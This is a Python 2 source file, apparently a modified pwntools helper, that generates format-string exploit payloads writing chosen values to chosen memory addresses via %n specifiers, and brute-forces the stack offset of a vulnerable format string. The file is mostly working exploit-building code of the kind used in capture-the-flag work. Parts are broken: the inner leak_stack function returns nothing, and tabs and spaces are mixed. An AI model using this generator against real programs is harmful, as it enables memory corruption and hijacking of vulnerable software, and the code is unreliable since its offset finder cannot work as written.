#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

import logging
import re

from pwnlib.log import getLogger
from pwnlib.memleak import MemLeak
from pwnlib.util.cyclic import *
from pwnlib.util.fiddling import randoms
from pwnlib.util.packing import *

log = getLogger(__name__)

def fmtstr_payload(offset,dic,numbwritten=0,write_size='byte',bits=64,mem_align = 0):
    """
    offset:buf distance from stack
    dic: a array of addr:value
    numbwritten: number written
    write_size: 'byte', 'short', 'int'
    bits: 32,64
    mem_align align payload to memory
    """
    config = {
        32 : {
            'byte': (4, 1, 0xFF, 'hh', 8, 4 ,p32),
            'short': (2, 2, 0xFFFF, 'h', 16, 4,p32),
            'int': (1, 4, 0xFFFFFFFF, '', 32, 4,p32)},
        64 : {
            'byte': (8, 1, 0xFF, 'hh', 8, 8,p64),
            'short': (4, 2, 0xFFFF, 'h', 16, 8,p64),
            'int': (2, 4, 0xFFFFFFFF, '', 32, 8,p64)
        }
    }
    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")
    number, step, mask, formatz, decalage ,ptr_size,pack = config[bits][write_size]

    payload=""
    adds=""
    count=0
    for add,value in dic.iteritems():
        for i in range(number):
            adds+=pack(add+i*step)
            n=(value>>(i*decalage))&mask
            pad=(n-numbwritten)&mask
            if pad == 0:
                payload+="%{}$"+formatz+"n"
            else:
                payload+="%{}c".format(pad)+"%{}$"+formatz+"n"
            numbwritten=n
            count+=1
    length = (len(payload)+ mem_align + ptr_size -1)/ptr_size*ptr_size
    payload=payload.ljust(length,'\x00')+adds
    payload=payload.format(*[offset+length/ptr_size + i for i in range(count)])
    return payload

def find_offset(execute_fmt,bits = 64):
    def leak_stack(offset, prefix=""):
        leak = execute_fmt(prefix+"START%{}".format(offset))
    if bits == 64:
        p = p64
    else:
        p = p32
    marker = cyclic(20)
    for off in range(1,1000):
	leak = leak_stack(off, marker)
	leak = p(leak)
	pad = cyclic_find(leak)
	if pad >= 0 and pad < 20:
            mark = "ASDASD"
            data = execute_fmt(mark)
            written = data.find(mark)
	    return off, written
    else:
	log.error("Could not find offset to format string on stack")
	return None, None
